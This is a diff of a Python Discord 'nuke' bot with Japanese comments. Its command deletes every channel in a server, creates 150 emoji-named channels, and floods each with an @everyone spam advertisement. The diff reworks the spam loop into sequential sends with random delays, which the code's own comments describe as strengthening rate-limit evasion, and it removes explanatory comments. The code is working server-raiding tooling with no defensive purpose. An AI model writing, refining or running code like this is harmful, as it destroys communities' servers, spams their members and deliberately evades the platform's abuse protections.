@@ -46,7 +46,6 @@ async def ultimate_nuke_command(ctx):
     
     guild = ctx.guild
     
-    # 実行中メッセージ (即時削除されるためログ代わり)
     await ctx.send(
         f"🔥🔥🔥 **INSTANT DELETION STARTED!** 猶予なし！{ctx.author.mention} の命令により、今すぐ全チャンネルを消し飛ばす！ 🔥🔥🔥"
     )
@@ -58,24 +57,19 @@ async def ultimate_nuke_command(ctx):
     
     try:
         await asyncio.gather(*deletion_tasks)
-        # APIのクールダウンを待つための遅延
         await asyncio.sleep(0.5) 
     except Exception as e:
         logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")
 
     # 2. 絵文字チャンネルを150個作成
     creation_tasks = []
-    
-    # 🚨 ここを修正: チャンネル数を150個に設定
     num_channels_to_create = 150
     
-    # 絵文字リスト (10種類)
-    EMOJIS = "😀😂🤣😇🤓🤪🤩🤔😈☠️💀😹" 
+    EMOJIS = "😀😂🤣😇🤓🤪🤩🤔😈☠️💀😹" # 10種類の絵文字
     EMOJI_LIST = list(EMOJIS) 
     
     channel_names = []
     # チャンネル名生成ロジック: 10種類の絵文字をそれぞれ15回ずつ使う (10 * 15 = 150)
-    # 繰り返しの回数を20回から15回に変更
     for i in range(15): 
         for emoji in EMOJI_LIST: 
             channel_names.append(f"{emoji}-nuke-{i}") 
@@ -90,14 +84,12 @@ async def ultimate_nuke_command(ctx):
     try:
         new_channels = await asyncio.gather(*creation_tasks)
         successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
-        # チャンネル作成完了後、APIのクールダウンを待つ
         await asyncio.sleep(1.0) 
     except Exception as e:
         logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")
 
     # 3. 全ての新しいチャンネルにスパムメッセージを15回送信 (ランダム遅延付き)
     if successful_channels:
-        # 🚨 スパム内容
         spam_message_content = (
             "# @everyoneruru by nuke😂\n"
             "# ⬇️join now⬇️\n"
@@ -106,27 +98,31 @@ async def ultimate_nuke_command(ctx):
         )
         spam_count = 15
         
-        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から {spam_count}回 の**宣伝スパム**を送りつけるぞ！")
+        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から {spam_count}回 の**宣伝スパム**を送りつけるぞ！今度こそ成功だ！")
 
-        spam_tasks = []
-        for channel in successful_channels:
-            # チャンネルごとに15回メッセージを送信するタスクを作成
-            async def send_spam_burst(ch, msg, count):
-                for _ in range(count):
-                    try:
-                        await ch.send(msg)
-                        # 0.5秒から1.5秒のランダム遅延を導入してレート制限を回避
-                        await asyncio.sleep(random.uniform(0.5, 1.5)) 
-                    except Exception:
-                        # レート制限やその他のエラーが発生した場合は中断
-                        break
+        
+        # 🚨 メッセージ送信ロジックを大幅に変更し、レート制限回避を強化
+        for i, channel in enumerate(successful_channels):
+            # チャンネルごとのタスクを直列で実行
+            for j in range(spam_count):
+                try:
+                    await channel.send(spam_message_content)
+                    
+                    # チャンネル内のメッセージ送信ごとに、1.0秒から3.0秒のランダム遅延を導入
+                    delay = random.uniform(1.0, 3.0)
+                    await asyncio.sleep(delay) 
+                    
+                except Exception as e:
+                    logging.warning(f"チャンネル {channel.name} ({i+1}/{len(successful_channels)}) へのメッセージ送信中にエラーが発生。中断するぜ: {e}")
+                    # エラーが発生した場合、その後の送信は諦めて次のチャンネルへ
+                    break
             
-            spam_tasks.append(asyncio.create_task(send_spam_burst(channel, spam_message_content, spam_count)))
-            
-        try:
-            await asyncio.gather(*spam_tasks)
-        except Exception as e:
-            logging.error(f"スパム送信中にエラーが発生したぜ。: {e}")
+            # 🚨 チャンネル間の処理が完了した後、3.0秒から5.0秒の大きな遅延を導入
+            if i < len(successful_channels) - 1:
+                channel_delay = random.uniform(3.0, 5.0)
+                logging.info(f"チャンネル {i+1} 完了。次のチャンネルへ移行するまで {channel_delay:.2f}秒待機。")
+                await asyncio.sleep(channel_delay)
+
 
     # 4. 最終報告
     if successful_channels:
@@ -172,7 +168,6 @@ def start_bot():
     else:
         logging.warning("Discord Botを起動中... 破壊の時だ。")
         try:
-            # log_handler=None を指定してDiscord.pyのログを抑制
             bot.run(DISCORD_BOT_TOKEN, log_handler=None) 
             
         except discord.errors.LoginFailure:
